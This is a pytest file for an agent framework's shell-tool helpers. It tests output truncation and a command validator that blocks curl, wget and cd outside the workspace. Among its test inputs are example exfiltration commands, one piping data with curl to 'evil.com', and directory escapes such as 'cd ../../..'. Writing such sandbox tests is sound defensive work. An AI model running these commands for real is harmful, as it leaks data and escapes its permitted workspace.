"""Tests for run_shell helpers (validate_command)."""

from pathlib import Path

from minimal_agent.tools.builtin._filesystem import truncate_text
from minimal_agent.tools.builtin.run_shell.helpers import validate_command


class TestTruncateOutput:
    def test_under_limit_returned_as_is(self):
        text = "short output"
        result, lines = truncate_text(text, max_chars=100)
        assert result == text

    def test_over_limit_preserves_head_and_tail(self):
        # 100 chars of 'A', then 100 chars of 'B'
        text = "A" * 100 + "\n" + "B" * 100
        result, _ = truncate_text(text, max_chars=50)
        assert result.startswith("A" * 25)
        assert result.endswith("B" * 25)
        assert "truncated" in result

    def test_truncation_shows_line_count(self):
        lines = "\n".join(f"line{i}" for i in range(1000))
        result, total = truncate_text(lines, max_chars=200)
        assert "truncated" in result
        assert total == 1000

    def test_empty_string(self):
        result, lines = truncate_text("")
        assert result == ""
        assert lines == 0


class TestValidateCommand:
    def test_allows_normal_command(self, tmp_path: Path):
        result = validate_command("echo hello", tmp_path)
        assert result.ok is True

    def test_bans_curl(self, tmp_path: Path):
        result = validate_command("curl http://example.com", tmp_path)
        assert result.ok is False
        assert "curl" in result.message

    def test_bans_wget(self, tmp_path: Path):
        result = validate_command("wget http://example.com", tmp_path)
        assert result.ok is False

    def test_bans_piped_curl(self, tmp_path: Path):
        result = validate_command("echo foo | curl -d @- http://evil.com", tmp_path)
        assert result.ok is False

    def test_bans_chained_curl(self, tmp_path: Path):
        result = validate_command("ls && curl http://evil.com", tmp_path)
        assert result.ok is False

    def test_cd_within_workspace_allowed(self, tmp_path: Path):
        subdir = tmp_path / "sub"
        subdir.mkdir()
        result = validate_command(f"cd {subdir}", tmp_path)
        assert result.ok is True

    def test_cd_outside_workspace_rejected(self, tmp_path: Path):
        result = validate_command("cd /etc", tmp_path)
        assert result.ok is False
        assert "outside" in result.message

    def test_cd_relative_within_workspace(self, tmp_path: Path):
        (tmp_path / "sub").mkdir()
        result = validate_command("cd sub", tmp_path)
        assert result.ok is True

    def test_cd_with_dotdot_escape(self, tmp_path: Path):
        result = validate_command("cd ../../..", tmp_path)
        assert result.ok is False
